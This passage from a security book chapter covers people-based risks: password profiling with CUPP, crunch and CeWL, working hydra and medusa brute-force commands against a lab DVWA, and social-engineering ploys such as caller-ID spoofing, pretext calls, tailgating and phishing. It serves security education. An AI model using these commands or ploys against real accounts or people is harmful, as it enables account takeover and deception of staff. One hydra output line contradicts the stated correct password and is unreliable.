# People {#people}

![10,000' view of People Security](images/10000People.gif)

Like the chapter on [Physical](#physical) security, the people problem is often over-looked, not only by technical people this time, but by all. For a proficient social engineer, it is generally fairly easy to craft and execute attacks. Although not quite as easy and simple as walking through the front door that is left open. With a little patience, practice and the right frame of mind, the majority of people can be played successfully, even those that are very aware.

Why is it often over-looked? A couple of reasons I can think of.

1. It is too simple
2. Many of us do not like to put the spot-light on ourselves and look deep inside to try and find what makes us tick, what our flaws look like, why they exist, how we can re-architect the affected areas and in some cases work around them, but being aware of them. There is often real pain when we start poking and prodding at our inner weak areas.

As with many other attacks, this is often one that is a key component of a larger attack. 

## 1. SSM Asset Identification
Take results from [higher level Asset Identification](#starting-with-the-30000-foot-view-asset-identification). Remove any that are not applicable. Add any newly discovered. Here are some to get you started:

* People carry huge amounts of confidential information and not only in their bags and devices but also most importantly their brains. People are like sponges, we soak up information everywhere. We also leak a lot and are capable of leaking without even knowing it when played by a skilled social engineer, but I will leave that part to the Identify Risks section.
* State of mind. That is right, an engaged, devoted and loyal worker is truly an asset. I can not emphasise this enough.

_Todo_ Probably more here.

## 2. SSM Identify Risks {#people-identify-risks}
Risks based on the failures of people present a very different set of attack vectors than any others mentioned in this material. People are both complex, complicated and our personalities are full of faults just waiting to be compromised, thus the approach at finding vulnerabilities is quite different.  
You can still use some of the processes from the top level [2. SSM Identify Risks](#starting-with-the-30000-foot-view-identify-risks), but the outcomes can look quite different.  
I find the [Threat agents cloud](#starting-with-the-30000-foot-view-identify-risks-threat-agents) and [Likelihood and impact](#starting-with-the-30000-foot-view-identify-risks-likelihood-and-impact) diagrams still quite useful. Also [MS 5. Document the Threats](#ms-5-document-the-threats), [OWASP Risk Rating Methodology](#ms-5-document-the-threats) and the [intel-threat-agent-library](#intel-threat-agent-library) as they are technology agnostic.  
[OWASP Ranking of Threats](#ms-6-rate-the-threats), [MS 6. Rate the Threats](#ms-6-rate-the-threats)  and DREAD to a degree are useful.

People are the strongest point in a security process, they are often also the weakest.

### Morale, Productivity and Engagement Killers

#### Undermined Motivation
![](images/ThreatTags/easy-common-average-severe.png)

Studies show that motivation has a larger effect on productivity and quality than any other factor.  
Managers that do not lead from the front and walk the talk.  
I once worked in a team many years ago that was responsible for delivering a large project for one of the worlds largest courier companies. This meant architecting and implementing a mobile software solution that would have well over 100,000 couriers doing their pick-up and deliveries using our software to manage it all. This was before mobile devices were common place. The team was told that they would be rewarded for working many overtime hours to get this project deployed on time. As a team of mostly young software engineers, we accepted the challenge and we delivered what the client needed and on time. The team members that did most of the over-time hours were rewarded with approximately an extra 50c per hour. Enough Said?

#### Adding people to a Late Project
![](images/ThreatTags/average-common-easy-moderate.png)

Common questions you may hear a manager ask:

1. What can we do to make this project go faster?
2. Do you need more engineers?

Throwing more engineers at a problem usually makes it worse. The only definite way to get something built faster is to build a smaller thing. You can build a thing faster, but at least one aspect will suffer. For starters it will almost certainly be quality.

#### Noisy, Crowded Offices
![](images/ThreatTags/easy-widespread-easy-low.png)

Noise everywhere kills deep thought and concentration. Remove the ability to concentrate and loss of quality will be one of the main disadvantages.
   
#### Email
![](images/ThreatTags/easy-widespread-average-low.png)

The content is only 7% of communication. The rest is voice, tone, body language and context. It takes much longer to craft emails than to just open your mouth or to engage in just about any other form of communication. 
   
#### Meetings
![](images/ThreatTags/average-common-easy-low.png)

Be aware that this is actually not creating software.

#### Context Switching
![](images/ThreatTags/average-common-average-moderate.png)

Dividing your workload between multiple tasks destroys motivation and actually makes as more stupid. That is right. There has been studies performed at the Institute of Psychiatry which found that excessive use of technology reduced workers' intelligence. "Those distracted by incoming email and phone calls saw a 10-point fall in their IQ - more than twice that found in studies of the impact of smoking marijuana", said researchers

![](images/ContextSwitching.png)

Gerald Weinberg's rule that 20% of our time is lost every time we perform a context switch.

I have been around many administrative people that do not understand how much context switching effects all peoples effectiveness at performing any task. It is just more apparent in deeply technical workers. Each task we try and do in parallel, negatively impacts the other tasks we are working on. The more tasks we juggle, the less processing power we have for each one.

### Employee Snatching
![](images/ThreatTags/easy-verywidespread-difficult-moderate.png)

A very profitable tactic is for an adversary to in one shape or form acquire a staff member of a target organisation, perhaps a competing organisation. Depending on how long the staff member has worked for the target will depend how much of a gold mine they are. Why bother doing something illegal when you can just offer the staff member a better deal than they are currently getting?

### Weak Password Strategies {#people-identify-risks-weak-password-strategies}
![](images/ThreatTags/easy-widespread-average-severe.png)

#### Password Profiling

There are plenty of large password wordlists around. I discussed a handful of these in the [Tooling Set-up](#tooling-setup-kali-linux-tools-i-use-that-need-adding-to-kali-linux-password-lists) chapter. What an attacker does with password profiling is create short lists of words based on information gathered in the reconnaissance stage. These wordlists should be much shorter than the "off the shelf" wordlists sometimes used for brute forcing targets accounts.

If running any of the following tools produce a list with your password in it, I strongly suggest you review the [Countermeasures](#people-countermeasures-weak-password-strategies) section to learn what a good password is.

A> Wordlist generators are used to create short more precise and targeted wordlists. It's important here to understand organisational password policies etc and constrain the tool that you use to produce a wordlist to honour any password policies in place in the target organisation. Otherwise the tool will end up producing passwords not relevant to the target.

##### [Crunch](http://tools.kali.org/password-attacks/crunch) {#people-identify-risks-weak-password-strategies-password-profiling-crunch}

&nbsp;

Crunch seems a little lower level or granular, perhaps less personalised than the likes of cupp which we discuss soon. Often creating larger wordlists. Of course this depends on how you specify your arguments to crunch. The likes of the wildcards help with granularity. Crunch would probably be a good choice if you know more about organisational password policies and less about the individual people/person.

Generates every possible combination of characters you tell it to. Provides control over the character sets you want used. There is a collection of character sets in Kali Linux in `/usr/share/rainbowcrack/charset.txt` you can use. The better one is in the crunch directory though: `/usr/share/crunch/charset.lst` You can also specify a literal set of characters as an argument.

The `@` wildcard can be used to represent lowercase characters in the pattern you supply. For example specifying the pattern like: `-t @@@@@hithere` would inform crunch to create words up to 12 characters long. 5 of which were variable lower case and the 7 `hithere` that would always be the same. The rest of the wildcards can be seen in the man page.

A minimum and maximum length has to be specified. If your minimum and maximum do not match the length of your optional pattern exactly, crunch will provide direction as to what it expects.

If you do not provide the output `-o </location/of/crunch/output>` option, output will go to screen. When you run crunch it also informs you of the size of the output in MB, GB, TB and PB. Crunch will also print out how many lines it is going to write as it starts. Great for avoiding personal DOS of your file system.

To run crunch, simply run from the menu in Kali Linux:  
Password Attacks -> Offline Attacks -> crunch  
or from the terminal:

{linenos=off, lang=bash}
    crunch <min> <max> [options]
    # For example
    crunch 4 10 abcdef
    # Or specifying the characterset to use from file
    # and outputing to ~/crunchoutput
    # This output would of course be insanely huge. 8321 PB according to crunch
    crunch 4 10 -f /usr/share/crunch/charset.lst mixalpha-numeric -o ~/crunchoutput/out.txt
    # The man file has lots of examples also, so just:
    man crunch

##### Common User Passwords Profiler (CUPP) {#people-identify-risks-weak-password-strategies-password-profiling-cupp}

&nbsp;

Created by Muris Kurgas AKA j0rgan. This tool is easy to use and can be used in an interactive style `-i` where it interviews the person running it before it goes ahead and creates the wordlist output. We installed this in the [Tooling Setup](#tooling-setup-kali-linux-tools-i-use-that-need-adding-to-kali-linux-cupp) chapter.

Once you have git cloned it, as always check the source confirming what you are about to run. Then run it. I like to use the interactive mode `-i`. run it with no arguments to see the help screen. `cd` into `/opt/cupp/`.

Also have a look through the config file prior to running and change any settings you want to fine tune. It is all pretty straight forward.

Under the `[leet]` section you can remove any characters to look like something else or add additional ones. For example you could add `a=@` as well as `a=^`.

There are a number of other options to customise the output.

{linenos=off, lang=text}
    ./cupp.py -i

    [+] Insert the informations about the victim to make a dictionary
    [+] If you don't know all the info, just hit enter when asked! ;)
    
    > First Name: Bob
    > Surname: Builder
    > Nickname: Bobby
    > Birthdate (DDMMYYYY): 04071962
    
    
    > Partners) name: Wendy
    > Partners) nickname: Wend
    > Partners) birthdate (DDMMYYYY): 15041971
    
    
    > Child's name: Bob Junior
    > Child's nickname: Lilbob
    > Child's birthdate (DDMMYYYY): 15172001
    
    
    > Pet's name: Spot
    > Company name: BobBuildings
    
    
    > Do you want to add some key words about the victim? Y/[N]: y
    > Please enter the words, separated by comma. [i.e. hacker,juice,black] spaces will be \
    removed: can we fix it,yes we can
    > Do you want to add special chars at the end of words? Y/[N]: y
    > Do you want to add some random numbers at the end of words? Y/[N]n
    > Leet mode? (i.e. leet = 1337) Y/[N]: y
    
    [+] Now making a dictionary...
    [+] Sorting list and removing duplicates...
    [+] Saving dictionary to bob.txt, counting 31546 words.
    [+] Now load your pistolero with bob.txt and shoot! Good luck!

##### Who's your Daddy (WyD)

&nbsp;

Another password profiling tool that "_extracts words/strings from supplied files and directories. It parses files according to the file-types and extracts the useful information, e.g. song titles, authors and so on from mp3's or descriptions and titles from images._"

"_It supports the following filetypes: plain, html, php, doc, ppt, mp3, pdf, jpeg, odp/ods/odp and extracting raw strings._"

> [Remote Exploit](http://www.remote-exploit.org/articles/misc_research__amp_code/index.html)

##### [Custom Word List generator (CeWL)](http://tools.kali.org/password-attacks/cewl)

&nbsp;

I found CeWL to be quite useful for creating targeted wordlists of words scraped from your targets website.

"_CeWL is a ruby app which spiders a given url to a specified depth, optionally following external links, and returns a list of words which can then be used for password crackers_"

> [Robin Wood of digininja](https://digi.ninja/projects/cewl.php)

The general usage is (from the terminal) like:

{linenos=off, lang=bash}
    cewl -h # for um... help. All the options.
    cewl [options] URL
    # -d specifies depth to spider the url
    # -w <ouput file path>
    # -m <minimum word length to record>
    cewl -d 2 -m 3 -w ~/cewl-bob-wordlist.txt www.bobthebuilder.com/en-us/
    # If you go deep, it can take a very long time.

Now what you can do with the wordlist produced is augment it with the likes of [crunch](#people-identify-risks-weak-password-strategies-password-profiling-crunch) to add some extra characters that people often add or even [cupp](#people-identify-risks-weak-password-strategies-password-profiling-cupp) to make the passwords a bit more personal.

##### [Wordhound](https://bitbucket.org/mattinfosec/wordhound.git)

&nbsp;

Wordhound is a python application that creates word lists based on generic websites, plain text (emails for example), twitter, pdfs and reddit sub-reddits.

I discovered this tool in the Hacker Playbook 2. It looks like Kim had some trouble with it in Kali Linux. It does look like it has pretty good potential though. I did not get time to try it.

#### Brute Forcing

The following brute force attempts were against the Dam Vulnerable Web App (DVWA) in the OWASPBWA suite running at IP `192.168.56.22`.

When it comes to brute forcing web applications, I noticed the failed attempts always took longer than the successful ones (when I told the tool to use a specific search phrase for failure) due to the fact that the failure text you tell the tool to look for is found sometime before the tool has read everything in the response, as it would with a successful response.

Because there are so many web servers and web applications and they all do their login procedure differently. What I found that seemed to be the best way was to use an HTTP intercepting proxy (Iceweasel Tamper Data plug-in or better Burpsuite) and try several incorrect passwords and inspect the responses of each. Then try a known correct user and password and inspect the response. Now you just use the differing factor.  
Often there are several requests that occur before a successful log in (a `POST` followed by a `GET` in the case of DVWA) and I was wondering how the brute forcing tool would know how to combine the requests and responses of an unsuccessful and/or successful login attempt. The answer is, they don't. What I found though, was that there is usually a difference in the first response of the incorrect passwords to the first response of the correct password. For example, the incorrect responses may redirect the user back to the login.php page where as the correct response may redirect the user to an index.php page or similar. In this situation, you instruct the tool that a `login.php` means unsuccessful attempt and it will go looking for that string.

Often with HTTP brute forcing you will have to slow the requests down. Most tools provide options for that.

##### Hydra {#people-identify-risks-weak-password-strategies-brute-forcing-hydra}

&nbsp;

Seems like the most [mature](https://www.thc.org/thc-hydra/network_password_cracker_comparison.html) of the brute force specific tools.

To run hydra simply run from the menu in Kali Linux:  
Password Attacks -> Online Attacks -> hydra  
or from the terminal.

{title="SSH", linenos=off, lang=bash}
    hydra -l <username> -P <password or wordlist> <target> <protocol>
    # For example SSH if your SSH port is the default:
    hydra -l root -P /opt/cupp/bob.txt 192.168.56.22 ssh
    # Otherwise specify the port with -s.
    # May as well add some verbosity while we are at it with -v.
    # Also -L for a username wordlist file if you want to try many usernames.
    # Lower case -p for password typed in directly.
    hydra -s 20 -v -l root -p /path/and/wordlist.txt 192.168.56.22 ssh
    # -l can also be used with a file of usernames.

![](images/HandsOnHack.png)

I> ## Web Forms
I>
I> When it comes to using hydra against web forms, if you can, once you have the command set and ready to run, it is usually best to test it against the web site with a known good login to make sure hydra handles the success correctly and the failures correctly.
I>
I> You will need:
I> 
I> * IP address or host name
I> * Type of form. Listed in the man page.
I> * The name of the field that takes the username
I> * The name of the field that takes the password
I> * Failure message for a failed attempt. The only place you need to look is the response of the first request (It seems that any string in the response can be used, even if it is a redirect back to `login.php`, any header value, body value, or even header name) or success message (or cookie or what ever the web site uses to inform of success).

{icon=bomb}
G> ## The Play
G>
G> For this example, we need to add Bob the Builder that we profiled in the CUPP example above to the DVWA database. Now I knew that the passwords in the DVWA database were being stored as `MD5`s from the exercise I did in the [SQLi section](#web-applications-identify-risks-sqli) from the Web Applications chapter. Now if the DVWA had of assumed that the datastore would at some stage be compromised as discussed in the [Data-store Compromise](#web-applications-identify-risks-management-of-application-secrets-data-store-compromise) section and provided the correct [countermeasures](#web-applications-countermeasures-data-store-compromise) as discussed, we would not be able to reverse engineer the crypto strategy as easily and the time it takes to brute force the passwords would also be significantly increased due to the key stretching of the Key Derivation Functions (KDFs). With that in mind though, if you profile effectively you will end up with a small wordlist to use in your chosen brute force tool, which may only take a few hours or days for the average users password.
G>
G> For the sake of demonstration, I chose a password from the middle of the wordlist that CUPP produced: `Y35w3c4n!$@`. Bob thought he was being clever changing the characters of "yes we can" to look like numbers and adding some special characters to the end. Hackers know all the tricks though.  
G> Browse to `/phpmyadmin` of the OWASPBWA, -u `root` -p `owaspbwa` and find the dvwa database and add `Bob` as a `user` and his hashed password that we produced from:  
G> `echo -n 'Y35w3c4n!$@' | md5sum`  
G> `adff078ea28c7e56810b2bece495a6b4`  
G> to the `password` field.

![](images/phpmyadmin.png)

{icon=bomb}
G> Using an HTTP intercepting proxy as I mentioned above, let's use Burpsuite and our FoxyProxy. Once you have the DVWA running or another website you want to attempt to brute force, browse to the login page. Then turn the "Burp 8080" proxy on. Start burpsuite and make sure it is listening on port `8080` (or what ever your browsers proxy is going to send to). I added the correct `username` (Bob) but false `password` values to the `username` and `password` fields and submit, although you can add any values.
G>
G> Now in Burpsuites Proxy tab -> HTTP history tab, right click on the (`POST`) request and select Send to Intruder. Now go to the Intruder tab and in the Positions tab, you can keep the Attack type: "[Sniper](https://portswigger.net/burp/help/intruder_positions.html)" because we are only using one wordlist. If we were using a wordlist for usernames and a different one for passwords, we would probably want to use "Cluster bomb".
G>
Now clear all the highlighted fields apart from the `password` value. Now we go to the Payloads tab. Keep the Payload set to 1 and Payload type set to [Simple list](https://portswigger.net/burp/help/intruder_payloads_types.html).
G>
G> Now I just added `Y35w3c4n!$%`, `Y35w3c4n!$&`, `Y35w3c4n!$*` and `Y35w3c4n!$@`. The last being the correct password. It can pay to have a valid account to test with, especially with `HTTP`. You don't need FoxyProxy on anymore either.  
G> Go into the Intruder menu up the top -> Start attack. You will now get a pop up window with the results of the passwords you added.  
G> Now with the Response tab and Raw tab selected, start at the top of the requests and just arrow down through them, inspecting the differences as you go. You should see that the last one, that's the `Y35w3c4n!$@` password has one changed value from the other responses. It will have a `Location` header with value of `index.php` rather than `login.php` that all the failed responses contain.
G>
G> That is our difference that we use to feed to our brute forcing tool so that it knows when we have a successful login, even though in theory the login process isn't yet complete as we have not issued the follow up `GET` request, but it does not matter, as we know we would not have been given a `index.php` if we were not authorised.
G>
G> Now every web application will do something a bit different. You just need to look for the difference in response from a bad password to a good one and use that to feed to your brute forcing tool.
G>
G> Now we know that our request body looks like the following:
G> 
G> {linenos=off, lang=bash}
G>     username=admin&password=whatever&Login=Login
G> 
G> From that we build our command. `^USER^` instructs hydra to use the login (`-l`) text or path to file if the upper case `-L` is used. `^PASS^` instructs hydra to use the password wordlist we provide it with with the `-P` option.

{icon=bonb}
G> So here we go:
G> 
G> {linenos=off, lang=bash}
G>     # Taking the output from CUPP from above, which created a 31546 word wordlist.
G>     # This is a small snippet of our word list for our initial test.
G>     cat /opt/cupp/bob.txt
G>     Y35w3c4n!$%
G>     Y35w3c4n!$&
G>     Y35w3c4n!$*
G>     Y35w3c4n!$@ # Correct password.
G>     Y35w3c4n!%
G>     Y35w3c4n!%!
G> 
G>     # Now lets run our brute force.
G> 
G>     hydra -l Bob -P /opt/cupp/bob.txt 192.168.56.22 http-form-post \
G>     "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:login.php" -V
G>     # Can write attempts to a file with -o <file path>.
G>     # -v is less verbose

{title="output", linenos=off, lang=bash}
    Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service \
    organizations, or for illegal purposes.
    
    Hydra (http://www.thc.org/thc-hydra) starting at 2015-11-07 23:23:03
    [DATA] max 4 tasks per 1 server, overall 64 tasks, \
    4 login tries (l:1/p:4), ~0 tries per task
    [DATA] attacking service http-post-form on port 80
    [ATTEMPT] target 192.168.56.22 - login "Bob" - pass "Y35w3c4n!$%" - 14999 of 31546 [child 0]
    [ATTEMPT] target 192.168.56.22 - login "Bob" - pass "Y35w3c4n!$&" - 15000 of 31546 [child 1]
    [ATTEMPT] target 192.168.56.22 - login "Bob" - pass "Y35w3c4n!$*" - 15001 of 31546 [child 2]
    [ATTEMPT] target 192.168.56.22 - login "Bob" - pass "Y35w3c4n!$@" - 15002 of 31546 [child 3]
    [80][http-post-form] host: 192.168.56.22 login: Bob password: Y35w3c4n!$&
    1 of 1 target successfully completed, 1 valid passwords found
    Hydra (http://www.thc.org/thc-hydra) finished at 2015-11-07 23:23:03

A few things to note here.  
Instead of telling hydra what to look for in a failed attempt (`Login=Login:login.php` in our case) we can tell hydra what to look for in a successful attempt with something like the following.  
`string we expect for success` is hypothetical:

{linenos=off, lang=bash}
    hydra -l Bob -P /opt/cupp/bob.txt 192.168.56.22 http-form-post \
    "/dvwa/login.php:username=^USER^&password=^PASS^&S=string we expect for success" -V

Hydra has many other options. Plenty of good [documentation](http://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-online-web-form-passwords-with-thc-hydra-burp-suite-0160643/) out there along with a decent man page.

##### Medusa

&nbsp;

I did not have success with Medusa for brute forcing HTTP  
Medusa was created due to the fact that the author was having some strife with Hydra.

To list the supported modules:

{linenos=off, lang=bash}
    medusa -d

{title="output", linenos=off, lang=bash}
    Medusa v2.0 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

    Available modules in "." :
  
    Available modules in "/usr/lib/medusa/modules" :
      + cvs.mod : Brute force module for CVS sessions : version 2.0
      + ftp.mod : Brute force module for FTP/FTPS sessions : version 2.0
      + http.mod : Brute force module for HTTP : version 2.0
      + imap.mod : Brute force module for IMAP sessions : version 2.0
      + mssql.mod : Brute force module for M$-SQL sessions : version 2.0
      + mysql.mod : Brute force module for MySQL sessions : version 2.0
      + ncp.mod : Brute force module for NCP sessions : version 2.0
      + nntp.mod : Brute force module for NNTP sessions : version 2.0
      + pcanywhere.mod : Brute force module for PcAnywhere sessions : version 2.0
      + pop3.mod : Brute force module for POP3 sessions : version 2.0
      + postgres.mod : Brute force module for PostgreSQL sessions : version 2.0
      + rexec.mod : Brute force module for REXEC sessions : version 2.0
      + rlogin.mod : Brute force module for RLOGIN sessions : version 2.0
      + rsh.mod : Brute force module for RSH sessions : version 2.0
      + smbnt.mod : Brute force module for SMB (LM/NTLM/LMv2/NTLMv2) sessions : version 2.0
      + smtp-vrfy.mod : Brute force module for enumerating accounts via SMTP \
      VRFY : version 2.0
      + smtp.mod : Brute force module for SMTP Authentication with TLS : version 2.0
      + snmp.mod : Brute force module for SNMP Community Strings : version 2.0
      + ssh.mod : Brute force module for SSH v2 sessions : version 2.0
      + svn.mod : Brute force module for Subversion sessions : version 2.0
      + telnet.mod : Brute force module for telnet sessions : version 2.0
      + vmauthd.mod : Brute force module for the VMware Authentication Daemon : version 2.0
      + vnc.mod : Brute force module for VNC sessions : version 2.0
      + web-form.mod : Brute force module for web forms : version 2.0
      + wrapper.mod : Generic Wrapper Module : version 2.0    

Choose your module and get more information on it:

{linenos=off, lang=bash}
    medusa -M web-form -q

{title="output", linenos=off, lang=bash}
    web-form.mod (2.0) Luciano Bello <luciano@linux.org.ar> :: Brute force module for web forms
    
    Available module options:
      USER-AGENT:?       User-agent value. Default: "I'm not Mozilla, I'm Ming Mong".
      FORM:?             Target form to request. Default: "/"
      DENY-SIGNAL:?      Authentication failure message. Attempt flagged as
                         successful if text is not present in server response. \
                         Default: "Login incorrect"
      FORM-DATA:<METHOD>?<FIELDS>
                         Methods and fields to send to web service. \
                         Valid methods are GET and POST. \
                         The actual form data to be submitted should also be defined here. \
                         Specifically, the fields: username and password. \
                         The username field must be the first, followed by the password field.
                         Default: "post?username=&password="
    

Against the DVWA in the OWASPBWA suite, I used the following command:

{linenos=off, lang=bash}
    # Using our wordlist generated from CUPP from above.
    medusa -h 192.168.56.22 -u Bob -P /opt/cupp/bob.txt \
    -M web-form -m FORM:"/dvwa/login.php" -m DENY-SIGNAL:"login.php" \
    -m FORM-DATA:"post?username=&password=&Login=Login"

{title="output", linenos=off, lang=bash}
    Medusa v2.0 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

    ERROR: The answer was NOT successfully received, understood, and accepted while trying \
    bob 0010115: error code  302
    ACCOUNT CHECK: [web-form] Host: 192.168.56.22 (1 of 1, 0 complete) \
    User: bob (1 of 1, 0 complete) Password: 0010115 (1 of 31546 complete)

I also tried with just the correct password. The issue was that Medusa was not handling the redirects properly, so you end up with a `HTTP 302`

##### nmap [http-form-brute](https://nmap.org/nsedoc/scripts/http-form-brute.html)

&nbsp;

I think the following may have suffered from the redirect problem also. Since then I found a [few changes](http://seclists.org/nmap-dev/2014/q3/479) to this script which may have fixed it, although I have not re-tested. The following command just took too long to complete. It may have got confused with the redirect. I am not sure.

{linenos=off, lang=text}
    nmap 192.168.56.22 -p80 --script=http-form-brute --script-args \
    'path="/dvwa/login.php", \
    method="post", \
    hostname="192.168.56.22", \
    onfailure="login.php", \
    passvar=admin, \
    uservar=admin' -vvv -d

I address the compromise of password hashes in the Web Applications chapter under [Management of Application Secrets](#web-applications-identify-risks-management-of-application-secrets-cracking).

### Phone Calls {#people-identify-risks-phone-calls}
![](images/ThreatTags/average-common-average-severe.png)

With practice this can become reasonably easy to pull off, also with very little risk. Plus the social engineer (SE) can practice, practice, practice until they get the results they are looking for. If at first they do not succeed, then they can simply hangup and try again in a few days. Each attempt improving on what let them down last time.  
As mentioned in Bruce Schneier's Beyond Fear: Convicted hacker Kevin Mitnick testified before Congress in 2000 about social engineering. “_I was so successful in that line of attack that I rarely had to resort to a technical attack,_” he said. “_Companies can spend millions of dollars toward technological protections, and that’s wasted if somebody can basically call someone on the telephone and either convince them to do something on the computer that lowers the computers defences or reveals the information they were seeking._”  
The government that imprisoned Kevin Mitnick for nearly five years, later [sought his advice](http://www.politechbot.com/p-00969.html) about how to keep its own networks safe from intruders.

### Spoofing Caller Id {#people-identify-risks-spoofing-caller-id}
![](images/ThreatTags/easy-widespread-difficult-low.png)

This is arranging an impersonated identification (name or number) to be displayed on the receiving end of a phone that is in the state of receiving a call or SMS. The telephony providers do not perform authentication on whether the caller Id is valid or spoofed. To disambiguate, this is the caller Id and not the caller number.  
This can be quite a useful confirmation for a social engineer to use as part of their pretexting. Caller Id spoofing has been around since at least 2004, with companies offering paid services like:

* SpoofApp
* SpoofCard
* SpoofTell
* Jumblo
* and many more coming and going all the time.

Some are free some are paid for. The SMS providers offering spoofing capabilities seem to come and go a lot, as they get shut-down regularly.

Or you can [DIY](http://www.social-engineer.org/wiki/archives/CallerIDspoofing/CallerID-SpoofingWithAsterisk.html) with the likes of [Asterisk](http://www.asterisk.org/get-started), an open source framework providing all the tools anyone would need to spoof caller Ids and much more. You will need a VoIP service provider, but you control everything else and all of the information about your targets is in your hands alone.

If you are planning a phone call, you are going to have to have a pretty solid idea of who your pretext is and know as much as possible about them in order to make your pretext believable. This is where you really draw from the reconnaissance as seen in the [Processes and Practises](#process-and-practises-penetration-testing-reconnaissance) chapter. It is a good idea to script out the points you (social engineer) want to cover in your phone call. Rehearse the points many times so that they become very natural sounding. The more you practise, the easier it will be when you have to deviate (the target will often throw curve balls at you) from your points and come back to them. There is no substitute for having as much information as possible on the target and have rehearsed the call many times.

SMS spoofing can also be very useful. Most services can not handle return messages though, unless the attacker has physical access to a phone that would contact the targets phone (as with [flexispy](http://blog.flexispy.com/spoof-sms-powerful-secret-weapon-shouldve-using/)) and can install software on the initiating phone which the attacker can control.

SMS spoofing was [removed](https://github.com/trustedsec/social-engineer-toolkit/blob/master/readme/CHANGES#L285) from the social engineering toolkit in version 6.0 due to lack of maintenance. I think mainly because it is getting harder to successfully do due to the telecommunication providers clamping down.

### Favour for a Favour {#people-identify-risks-favour-for-a-favour}
![](images/ThreatTags/easy-common-average-severe.png)

How this works:
An Attacker (Pretexter) calls someone at the target organisation (often an employee). Then explains to them that something has just happened that will stop them from doing their work. Ideally something that the victim can not immediately verify. Attacker suggests that they may be able to fix the problem for the employee, but it will be a big favour. Victim agrees and is very appreciative. Once the attacker has pretended to fix the employees issue, they get the victim to confirm that it is now working (of course it always was working). Victim confirms it is now working and is very appreciative. Now the victim essentially owes the attacker a favour. The attacker can use this favour that is essentially owed to them immediately or often more effectively the next day (next day seems more genuine).

These attacks are the easiest to carry out on:

* new people
* people with limited computer knowledge and skills, as they probably will not realise what value exists on the computer or network for the person that is just apparently helped them out

### The New Employee {#people-identify-risks-the-new-employee}
![](images/ThreatTags/easy-common-average-severe.png)

New employees will not intuitively know a lot of people in the organisation yet. They will not yet understand the hierarchical relationships and processes. They will not be aware of the security policies and culture in force. They will be as keen as can be to make good impressions with everyone they relate with.

### We Have a Problem {#people-identify-risks-we-have-a-problem}
![](images/ThreatTags/average-common-average-severe.png)

An excellent way of gaining additional trust is to fix the problem that does not exist. Lead the victim to believe that there is a problem that will stop them from getting there work done in some way. Request a little information. Fix the problem that never existed. Victim verifies that there is no longer a problem. Request additional sensitive information. Using the fact that you just did a favour for the victim to elicit what you are after.

### It's Just the Cleaner {#people-identify-risks-its-just-the-cleaner}
![](images/ThreatTags/easy-common-easy-severe.png)

Grab your self a cleaners uniform and you have got access to just about everything within an organisation. It really is that simple. Often when my wife was doing commercial cleaning and she walked into a room at 20:00 - 21:00 with a few developers left working away. They would sometimes be surprised because they had not been told that the cleaners were coming, let-a-lone, who they were. The response would usually go something like "Oh, it is just the cleaners". Why? Because they had their free pass... a cleaners uniform, maybe a broom or vacuum cleaner or mop.

### Tailgating {#people-identify-risks-tailgating}
![](images/ThreatTags/easy-common-easy-moderate.png)

Effective ways at getting into a work premises.

1. Mingle in with a crowd of people returning from a lunch break. Be prepared to drop some names of people that work there but are not in the current group. Yes, that means you have to do your home work and know their faces. You will get through the locked front door 99% of the time.
2. Wait in the car park until you see someone close to the front door (inside or outside) and carry a large heavy **looking** box toward the door. 99% of the time, they will open the door for you. Just make sure you have thought about all possible questions that may get fired at you and have well researched answers ready to respond with.
3. Even before you get to the building itself, often premises will have gates that open by remote control or card. If an attacker is close enough to someone already entering the premises, they will get through at the same time. Now obviously this needs to be as inconspicuous as possible. Like park close enough but not too close as to be recognised as pulling out from an external car park to tailgate the way in. Also early mornings are best for this, as staff are often still half asleep when they turn up to work. Picking your target to follow in is where you will use the OSINT you have gathered during the reconnaissance phase. An attacker will choose someone that likely doesn't get a lot of sleep. Maybe a late night coder, hacker, gamer, or someone that has a new born baby and doesn't get much sleep.

### Phishing {#people-identify-risks-phishing}
![](images/ThreatTags/average-widespread-easy-moderate.png)

Emails being sent out with payloads veiled with enticing email subjects, file names, etc. in the form of web links and files that when executed deliver a malicious payload. Also check out the [Infectious Media](#people-identify-risks-infectious-media) section in this chapter. Casting a wide net in the hope that a number of the receivers will fall for the scam. This attack takes advantage of the large number of receivers that will potentially fall for the scam. Generally the percentage of victims will be much lower than if it was a spear phishing attack, because the email will be more general in the attempt to reach less specific targets.  
Like large commercial fishing enterprises, this type of attack is very common and being executed on large scale in many instances at a time.  
This type of attack is also usually a lot easier to detect, because the attackers have to be more general in their approach and they rely less on detailed information gathering of their victims when crafting the attack than if it was more targeted.  
The outcome on average is also usually less dramatic. Yes the odd victim will be fooled. This type of attack is a numbers game. For example 100 people may be fooled when a 50'000 email campaign is crafted and sent.

SET has many options to help with this type of attack. They are all covered at the [social-engineer.org](http://www.social-engineer.org/framework/se-tools/computer-based/social-engineer-toolkit-set/) website.

SET can use sendmail, gmail or your own open-mail relay out of the box to perform your attacks.

### Spear Phishing {#people-identify-risks-spear-phishing}
![](images/ThreatTags/easy-common-average-severe.png)

_Todo_ Discuss what targets are likely to click on.

%% Book: Social Engineering The Art Of Human Hacking
%%   Pg 50 has good info about what people are likely to click on.-->

This type of attack is targeted toward a smaller number of receivers generally with more specifically tailored scams. In order to pull a successful attack off, that is one that has a high catch rate and where no receivers actually raise alarm bells with managers, scrupulous reconnaissance needs to be carried out on your target(s).

{#wdcnz-demo-2}
![](images/HandsOnHack.png)

The following attack was one of five that I demonstrated at WDCNZ in 2015. There was one leading up to this which focused on exploiting a Cross-Site Scripting (XSS) vulnerable website with the Browser Exploitation Framework (BeEF). This can be found in chapter 12 under the [Cross-Site Scripting (XSS)](#web-applications-identify-risks-cross-site-scripting) section.

You can find the video of how this attack is played out [here](https://www.youtube.com/watch?v=tb4o5UCHzSA).

I> ## Synopsis
I>
I> Clone a website that we know our victim visits and has to log-in at.  
I> Host the clone from our attack machine, although this could be hosted anywhere and would be more effective in not getting caught, hosting on the likes of one of the free VPSs on the internet.  
